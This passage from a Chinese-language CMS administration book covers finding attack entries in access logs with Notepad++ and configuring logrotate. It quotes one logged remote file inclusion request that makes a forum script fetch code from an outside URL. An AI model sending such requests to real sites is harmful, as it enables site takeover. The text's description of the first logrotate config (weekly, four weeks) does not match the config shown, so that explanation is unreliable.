

在 Notepad++ 中，通过点击“搜索 ➤ 查找 ➤ 当前文档”打开搜索框。当你选择“在当前文档中全部查找”选项时，Notepad++ 会在一个单独的窗口中显示结果，方便你处理，如图 8-16 所示。

![](img/8bd670d4939cf71dbd0c6123d1b834ff_304_0.png)

![](img/8bd670d4939cf71dbd0c6123d1b834ff_304_1.png)

在本示例中，查找 googlebot.com。Notepad++ 从访问日志中返回如图 8-17 所示的行。

![](img/8bd670d4939cf71dbd0c6123d1b834ff_305_0.png)

![](img/8bd670d4939cf71dbd0c6123d1b834ff_305_1.png)

搜索结果会告诉你需要从列表中移除哪些条目（如果需要的话）。在本示例中，这些条目是原始日志文件中的第 62、63 和 64 行。将其突出显示并删除。根据需要重复此过程。

现在，返回到攻击条目列表。再抓取另一个 IP 地址，这也会产生结果。图 8-18 中显示的（经过脱敏的）IP 地址解析到澳大利亚的一台主机。

![](img/8bd670d4939cf71dbd0c6123d1b834ff_305_2.png)

下面显示了日志中的条目。攻击者试图查看他们是否能在网站上运行此处所示 URL 处的代码。这种常见技巧对攻击者来说有相当高的成功率。

```
GET %20%20//forum/userLogin.php?config[forum_installed]=http://www.footballtrainingssecrets.info/jim/includes/js/tabs/int1.txt????
```

在这种情况下，你可以使用 Notepad++ 收集所有显示此攻击的条目，并将其报告给攻击源 IP 地址所属的注册 ISP。如果攻击者造成困扰，你可以屏蔽该 IP 地址，也可以忽略它。

如你所见，Notepad++ 是分析日志文件的绝佳工具，因为它能打开非常大的文件，并且具有出色的搜索选项。

## 使用日志轮转

正如你在整章中所见，日志的收集和使用是 CMS 网站的一项重要任务。日志既可以成为未来情况的预兆，也可以成为过去事件的历史记录。

日志在短时间内是有用的。除非你（出于业务或法律要求）需要保留多年的日志，否则你应保留大约三到四个月的日志。不过，这只是基于个人经验的一个数字。你的业务需求将决定合适的时间。

*日志轮转*涉及日志文件的滚动。通俗地讲，日志轮转本质上就是压缩并关闭旧日志文件，然后启动新的日志文件。Linux 操作系统为你提供了一种极好的方式来处理这项工作。

日志轮转由 *cron* 作业（定时器）驱动，它会唤醒并读取配置文件。该文件包含一组指令，告诉 logrotate 工具如何处理每个日志。

此外，你使用的可能是支持 cPanel 或其等效功能的主机。这些应用程序也提供了设置日志轮转的功能。

### 使用 logrotate 设置日志轮转

你可以手动执行日志轮转，在某些情况下，也可以在服务器控制面板中进行设置。

来自 cPanel.com 的 WHM 虚拟专用服务器（VPS）控制面板提供了一种简便的方法来设置轮转。在 WHM 控制面板中，你可以通过选择“主菜单 > 服务配置 > Apache 配置 > 日志轮转”来访问日志轮转选项。此时会出现如图 8-19 所示的界面。

```
# RPM packages drop log rotation information into this directory
include /etc/logrotate.d

# no packages own wtmp and btmp -- we'll rotate them here
/var/log/wtmp {
    monthly
    create 0664 root utmp
        minsize 1M
    rotate 1
}

/var/log/btmp {
    missingok
    monthly
    create 0600 root utmp
    rotate 1
}
# system-specific logs may also be configured here.
```

这段代码指示系统每周唤醒并轮转访问日志，并且只保留滚动四周的日志。每周，它都会使用日期作为后缀来压缩日志文件。最后，系统会创建一个新的日志。日志配置文件中的其余指令负责处理系统的内部需求。最后一行是为了允许其他配置选项而存在的：

```
# system-specific logs may also be configured here.
```

> **注意** 配置中的 # 符号表示注释。该符号可以出现在文件中的任何位置，只要它是行首的第一个字符即可。

以下是配置文件的另一个版本（在服务器的 shell 中通过 man logrotate 找到的）：

```
# sample logrotate configuration file

compress

/var/log/messages {
    rotate 5
    weekly
    postrotate
        /sbin/killall -HUP syslogd
    endscript
}

"/var/log/httpd/access.log" /var/log/httpd/error.log {
    rotate 5
    mail admin@domain.com
    size 100k
    sharedscripts
    postrotate
        /sbin/killall -HUP httpd
    endscript
}
```

在此示例中，第一条命令 *compress* 是全局指令，指示 logrotate 在轮转时压缩文件。接下来的指令告诉 logrotate 进行五次每周轮转。

到第六周时，它将删除最旧的一个日志。此外，在日志文件被轮转之后、压缩之前，它将运行 *postrotate* 之后列出的命令：`/sbin/killall -HUP syslogd`。

在 *endscript* 之后紧接着进行文件压缩。

下一部分指示 logrotate 在 `/access.log` 和 `error.log` 达到 100K 大小时对其进行轮转。这种特定设置会在五次轮转后，将未经压缩（100K）的日志版本通过电子邮件发送到 admin@domain.com。这样，你既可以在本地保留副本，也可以通过电子邮件进行“异地”保留。

文件最后一部分中的 *sharedscripts* 命令意味着 *postrotate* 脚本对这两个文件只运行一次，而不是每个日志运行一次。这样，它只需一次即可完成工作。

### 手动设置 *logrotate* 选项

logrotate 为你提供了大量日志选项。表 8-4 显示了帮助文档中的一些有价值选项。

> **注意** 你可以通过 shell 登录服务器并输入 **man logrotate** 来查看所有命令，这会显示所有可用的帮助选项。

**表 8-4：** logrotate 选项

| 选项 | 描述 |
|---|---|
| `compress` | 默认情况下，旧版本的日志文件使用 gzip 工具进行压缩。 |
| `compresscmd` | 指定用于压缩日志文件的压缩工具。默认为 gzip。 |
| `uncompresscmd` | 指定用于解压日志文件的命令。默认为 gunzip。 |
| `compressext` | 如果使用压缩，指定压缩日志文件所使用的扩展名。 |
| `copy` | 制作日志文件的副本，但完全不改变原始文件。例如，此选项可用于制作当前日志文件的快照，或当其他工具需要截断或解析该文件时使用。 |
| `copytruncate` | 在创建副本后将原始日志文件原地截断为零字节，而不是移动旧日志文件并选择性地创建新文件。更多信息请参阅手册页（例如，在 shell 中运行 `man logrotate`）。 |
| `create (mode, owner, group)` | 在轮转之后（运行 `postrotate` 脚本之前）立即创建日志文件（文件名与刚轮转的日志文件相同）。`mode` 以八进制指定日志文件的权限模式。`owner` 指定拥有日志文件的用户名称。`group` 指定日志文件所属的组。日志文件的任何属性都可以省略，如果省略，新文件的这些属性将使用原始日志文件对应属性的值。可以使用 `nocreate` 选项禁用此功能。 |
| `daily` | 日志文件每天轮转。 |
| `dateext` | 归档旧版本的日志文件，添加类似 `YYYYMMDD` 的每日扩展名，而不是简单地添加数字。 |
| `dateformat format_string` | 使用类似于 `strftime` 函数的表示法为 `dateext` 指定扩展名。仅允许使用 `%Y`、`%m`、`%d` 和 `%s` 选项。默认值为 `-%Y%m%d`。另请注意，分隔日志名称与扩展名的字符是 `dateformat` 字符串的一部分。 |
| `delaycompress` | 将前一个日志文件的压缩推迟到下一个轮转周期。 |
| `extension ext` | 轮转后，日志文件会被赋予最终扩展名 `.ext`。如果使用压缩，压缩扩展名（通常是 `.gz`）会出现在扩展名（`.ext`）之后。 |
| `ifempty` | 即使日志文件为空也进行轮转，这会覆盖 `notifempty` 选项（`ifempty` 是默认设置）。这意味着空日志与有内容的日志会被同样对待。 |
| `missingok` | 如果日志文件缺失，则继续处理下一个文件，不发出错误消息。另请参阅 `nomissingok`。 |
| `monthly` | 日志文件在每月第一次运行 `logrotate` 时进行轮转。（通常是在每月的第一天。） |
| `nocompress` | 不压缩旧版本的日志文件。 |
| `nocopy` | 不复制原始日志文件并将其留在原位。（这会覆盖 `copy` 选项。） |

